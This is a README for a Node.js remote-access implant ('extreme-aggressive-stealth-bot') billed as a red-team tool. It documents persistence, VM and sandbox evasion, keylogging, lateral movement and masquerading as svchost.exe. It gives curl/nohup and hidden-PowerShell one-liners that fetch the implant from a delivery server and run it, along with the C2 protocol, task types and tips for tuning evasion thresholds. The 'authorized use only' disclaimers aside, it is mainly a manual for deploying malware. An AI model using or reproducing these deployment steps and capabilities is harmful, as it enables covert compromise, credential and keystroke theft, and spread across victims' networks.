# extreme-aggressive-stealth-bot Attacker

---

## Overview

**Fully isolated, stealthy, persistent, multi-vector C2 bot for authorized penetration testing**

This Node.js implant provides comprehensive red team capabilities including:
- Multi-layered persistence (cron, systemd, startup folders)
- Anti-analysis evasion (VM/sandbox detection)
- Encrypted C2 communication (AES-256 + HMAC-SHA256)
- Multi-protocol C2 (HTTP/HTTPS/DNS fallback)
- Command execution, file transfer, screenshots, keylogging
- Lateral movement and self-destruct mechanisms

**⚠️ AUTHORIZED USE ONLY - Deploy only in environments where you have explicit written permission**

## Features

| Capability | Status | Description |
|------------|--------|-------------|
| **Persistence** | ✅ | Cron, systemd, Windows startup, process renaming |
| **Anti-Analysis** | ✅ | VM detection, sandbox evasion, low-resource checks |
| **C2 Communication** | ✅ | AES-256 encryption, HMAC auth, HTTP/HTTPS/DNS |
| **Command Execution** | ✅ | Stealth shell execution with output capture |
| **File Operations** | ✅ | Upload/download with encryption |
| **Screenshots** | 🔄 | Windows PowerShell (Linux/Mac WIP) |
| **Keylogger** | 🔄 | Keyboard hooks (platform-specific) |
| **Lateral Movement** | 🔄 | Network scanning + exploitation stubs |
| **Process Hiding** | ✅ | Detached processes, window hiding |
| **Self-Destruct** | ✅ | Trace cleaning + memory wiping |

## Prerequisites

- Node.js 14+ 
- Authorized C2 infrastructure
- Explicit written permission for target environment
- Root/administrator privileges recommended

## Quick Start

### 1. Configure C2 Server
```javascript
const C2_CONFIG = {
    primary: 'https://your-c2-server.com:443/api/v1',
    fallback: 'http://your-fallback-c2.com:8080',
    dns_c2: 'c2.yourdomain.com',
    keys: {
        encrypt: 'your-32-byte-aes-key-here12345678901234567890', // 32 bytes
        auth: 'your-hmac-sha256-secret-key-here!!'
    }
};
```

### 2. Deploy
```bash
# Linux/Mac
curl -o svchost.js https://your-delivery-server/extreme-aggressive-stealth-bot.js
nohup node svchost.js > /dev/null 2>&1 &

# Windows
powershell -c "iwr -Uri 'https://your-delivery-server/extreme-aggressive-stealth-bot.js' -OutFile '$env:APPDATA\svchost.js'; Start-Process node -ArgumentList '$env:APPDATA\svchost.js' -WindowStyle Hidden"
```

### 3. C2 Server Endpoints
```
POST /api/v1/checkin    # Bot registration + task retrieval
POST /api/v1/report     # Task results
POST /api/v1/upload     # File uploads
```

## C2 Protocol

### Checkin Payload (Client → Server)
```json
{
    "id": "a1b2c3d4e5f67890",
    "hostname": "target-host",
    "platform": "linux",
    "arch": "x64",
    "uptime": 12345.67,
    "pid": 1234,
    "timestamp": 1640995200000
}
```

### Task Response (Server → Client)
```json
[
    {
        "id": "task-001",
        "type": "shell",
        "command": "whoami"
    },
    {
        "type": "download", 
        "url": "https://your-server/payload.exe",
        "path": "/tmp/payload.exe"
    }
]
```

## Persistence Methods

1. **Cron** (`@reboot` jobs)
2. **Systemd** services (`bot.service`)
3. **Windows Startup** (`AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`)
4. **Process Masquerading** (renames to `svchost.exe`, `lsass.exe`, etc.)

## Anti-Analysis

- CPU core count < 2
- RAM < 2GB 
- VM artifacts (`vmware`, `virtualbox`, `qemu`)
- Sandbox signatures in `/proc`
- Root execution in analysis environments

## Customization

### Enable/Disable Features
```javascript
const BOT_CONFIG = {
    persistence: true,
    anti_vm: true,
    anti_sandbox: true,
    process_hiding: true,
    rootkit_mode: true,
    self_destruct: false  // Set true for cleanup missions
};
```

## Command Reference

| Task Type | Parameters | Description |
|-----------|------------|-------------|
| `shell` | `{command: "string"}` | Execute shell command |
| `download` | `{url: "string", path: "string"}` | Download file |
| `upload` | `{path: "string"}` | Upload file |
| `screenshot` | `{}` | Capture screenshot |
| `keylogger` | `{duration: number}` | Start keylogger |
| `persistence` | `{}` | Re-apply persistence |
| `spread` | `{targets: ["ip/cidr"]}` | Lateral movement |
| `self_destruct` | `{}` | Clean exit |

## Troubleshooting

| Issue | Solution |
|-------|----------|
| No checkins | Verify C2 keys, firewall, DNS resolution |
| Persistence fails | Check sudo/root privileges |
| Analysis detection | Adjust `antiAnalysisChecks()` thresholds |
| Command timeouts | Increase `timeout` values in `executeShell()` |

## License

![CC BY-NC-ND 4.0](https://mirrors.creativecommons.org/presskit/buttons/88x31/png/by-nc-nd.png)

**Creative Commons Attribution-NonCommercial-NoDerivs 4.0 International (CC BY-NC-ND 4.0)**

### You are free to:
- **Share** — copy and redistribute the material in any medium or format

### Under the following terms:
- **Attribution** — You must give appropriate credit, provide a link to the license, and indicate if changes were made. 
- **NonCommercial** — You may not use the material for commercial purposes.
- **NoDerivatives** — If you remix, transform, or build upon the material, you may not distribute the modified material.

**Full License Text:** https://creativecommons.org/licenses/by-nc-nd/4.0/legalcode

--- 
**Version:** 1.0.0  
**Deploy only in authorized pentesting environments**  
**Not for production use or unauthorized testing**
